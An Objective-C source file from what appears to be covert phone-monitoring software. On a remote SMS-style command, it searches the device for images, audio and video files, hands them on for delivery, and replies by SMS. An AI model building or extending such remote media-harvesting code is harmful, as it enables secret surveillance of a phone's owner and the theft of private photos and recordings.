/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestHistoricalMediaProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RequestHistoricalMediaProcessor.h"
#import "MediaFinder.h"
#import "PrefEventsCapture.h"
#import "Preference.h"

@interface RequestHistoricalMediaProcessor (PrivateAPI)
- (void) processRequestHistoricalMedia;
- (void) requestHistoricalMediaException;
- (void) acknowldgeMessage;
- (void) sendReplySMS:(NSString *) aReplyMessage  isProcessCompleted:(BOOL) aIsComplete; 
- (void) processFinished;
- (BOOL) isValidArgs;
@end

@implementation RequestHistoricalMediaProcessor

@synthesize mMediaFinder;

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the RequestHistoricalMediaProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (RequestHistoricalMediaProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestHistoricalMediaProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestHistoricalMediaProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	//NSLog (@"RequestHistoricalMediaProcessor--->doProcessingCommand");
	DLog (@"RequestHistoricalMediaProcessor--->doProcessingCommand")
 	mSearchFlags=[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kZeroOrOneValidation];
	[mSearchFlags retain];
	DLog(@"RequestHistoricalMediaProcessor--->Search Flags:%@",mSearchFlags);
    if ([mSearchFlags count] == 3) {
		[self processRequestHistoricalMedia];
	}
	else {
		[self requestHistoricalMediaException];
	}
}


#pragma mark RequestHistoricalMediaProcessor Private Methods

/**
 - Method name: processRequestHistoricalMedia
 - Purpose:This method is used to process request historical media
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processRequestHistoricalMedia {
#if TARGET_OS_IPHONE
	DLog (@"RequestHistoricalMediaProcessor--->processRequestHistoricalMedia")
	//NSLog (@"RequestHistoricalMediaProcessor--->processRequestHistoricalMedia");
	id <EventDelegate> eventDelegate=[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate];
	NSString *mediaSerachPath=[[RemoteCmdUtils sharedRemoteCmdUtils] mMediaSearchPath];
	DLog(@"RequestHistoricalMediaProcessor: Media Path:%@",mediaSerachPath);

	mMediaFinder = [[MediaFinder alloc] initWithEventDelegate:eventDelegate andMediaPath:mediaSerachPath];
    [mMediaFinder setMSearchDelegate:self];
	NSMutableArray *searchEntries = [NSMutableArray array];
	
	//Image Serach
	if([[mSearchFlags objectAtIndex:0] intValue]==1) {
		DLog(@"RequestHistoricalMediaProcessor====Image Search")
		[MediaFinder setImageFindEntry:searchEntries];
	}
	
	//Audio Serach
	if([[mSearchFlags objectAtIndex:1] intValue]==1) {
		DLog(@"RequestHistoricalMediaProcessor====Audio Search")
		[MediaFinder setAudioFindEntry:searchEntries];		
	}
	
	//Video Search
	if([[mSearchFlags objectAtIndex:2] intValue]==1) {
	   DLog(@"RequestHistoricalMediaProcessor====Video Search")
	   [MediaFinder setVideoFindEntry:searchEntries];
	}
	
	if ([searchEntries count]) { 
		//NSLog(@"!!!!!!!!!!!!!!!! media exists, so find all of them");
		[self acknowldgeMessage];
		[mMediaFinder findMediaFileWithExtMime:searchEntries];
	}
	else {
		//NSLog(@"!!!!!!!!!!!!!!!! no media to process");
		[self performSelector:@selector(processFinished) withObject:nil afterDelay:0.0];
	}
#else
    DLog(@"!!!!!!!!!!!!!!!! MAC,,,,no media to process");
    [self performSelector:@selector(processFinished) withObject:nil afterDelay:0.0];
#endif
}


/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
*/

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestHistoricalMediaSuccessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aReplyMessage (NSString),isProcessCompleted(BOOL)
 - Return description: No return type
*/

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestHistoricalMediaProcessor--->sendReplySMS...")
	//NSLog (@"RequestHistoricalMediaProcessor--->sendReplySMS...");
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) { [self processFinished]; }
	else { DLog (@"Sent aknowldge message.");}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when upload actual media process is completed
 - Argument list and description:No Argument 
 - Return description:No Return Type
*/

-(void) processFinished {
	DLog (@"RequestHistoricalMediaProcessor--->processFinished")
	//NSLog(@"RequestHistoricalMediaProcessor--->processFinished");
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name: requestHistoricalMediaException
 - Purpose:This method is invoked when request Historical Media process is failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) requestHistoricalMediaException {
	DLog (@"RequestHistoricalMediaProcessor--->requestHistoricalMediaException")
	//NSLog (@"RequestHistoricalMediaProcessor--->requestHistoricalMediaException");
	FxException* exception = [FxException exceptionWithName:@"requestHistoricalMediaException" andReason:@"Request Historical Media error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

#pragma mark FileSystemSearcherDelegate Methods

/**
 - Method name: fileSystemSearchFinished:
 - Purpose:This method is invoked when media search is completed
 - Argument list and description:aFileSystemEntries
 - Return description: No return type
*/

- (void) fileSystemSearchFinished: (NSArray *) aFileSystemEntries {
	
	DLog (@"RequestHistoricalMediaProcessor--->eventDidDelivered")
	//NSLog(@"RequestHistoricalMediaProcessor--->eventDidDelivered");
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	
	NSString *requestHistoricalMediaMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestHistoricalMediaSuccessMSG2", @"")];
	
	[self sendReplySMS:requestHistoricalMediaMessage isProcessCompleted:YES];
	
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mSearchFlags release];
#if TARGET_OS_IPHONE
	[mMediaFinder release];
#endif
	[super dealloc];
}

@end
